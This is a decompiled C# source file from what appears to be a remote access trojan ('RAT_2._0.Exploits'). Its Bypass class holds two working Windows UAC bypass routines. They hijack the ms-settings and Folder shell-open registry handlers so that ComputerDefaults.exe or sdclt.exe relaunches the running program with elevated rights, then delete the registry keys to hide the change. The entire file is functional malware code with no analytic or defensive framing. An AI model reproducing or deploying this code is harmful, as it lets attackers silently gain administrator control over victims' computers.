using System;
using System.Diagnostics;
using System.Security.Principal;
using System.Threading;
using Microsoft.Win32;

namespace RAT_2._0.Exploits
{
	// Token: 0x02000006 RID: 6
	internal class Bypass
	{
		// Token: 0x0600001A RID: 26 RVA: 0x00002AE0 File Offset: 0x00000CE0
		public static bool RunAsAdmin()
		{
			return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
		}

		// Token: 0x0600001B RID: 27 RVA: 0x00002B08 File Offset: 0x00000D08
		public static void Method_1()
		{
			bool flag = !Bypass.RunAsAdmin();
			if (flag)
			{
				RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Classes\\ms-settings\\Shell\\Open\\command", RegistryKeyPermissionCheck.ReadWriteSubTree);
				registryKey.SetValue("DelegateExecute", "");
				registryKey.SetValue("", Process.GetCurrentProcess().MainModule.FileName);
				registryKey.Close();
				Thread.Sleep(3000);
				Process.Start("C:\\windows\\system32\\ComputerDefaults.exe");
				Thread.Sleep(5000);
				Registry.CurrentUser.DeleteSubKey("Software\\Classes\\ms-settings\\Shell\\Open\\command", false);
			}
		}

		// Token: 0x0600001C RID: 28 RVA: 0x00002B9C File Offset: 0x00000D9C
		public static void Method_2()
		{
			bool flag = !Bypass.RunAsAdmin();
			if (flag)
			{
				RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Classes\\Folder\\shell\\open\\command", RegistryKeyPermissionCheck.ReadWriteSubTree);
				registryKey.SetValue("DelegateExecute", "");
				registryKey.SetValue("", Process.GetCurrentProcess().MainModule.FileName);
				registryKey.Close();
				Thread.Sleep(3000);
				Process.Start("C:\\windows\\system32\\sdclt.exe");
				Thread.Sleep(5000);
				Registry.CurrentUser.DeleteSubKey("Software\\Classes\\Folder\\shell\\open\\command", false);
			}
		}
	}
}
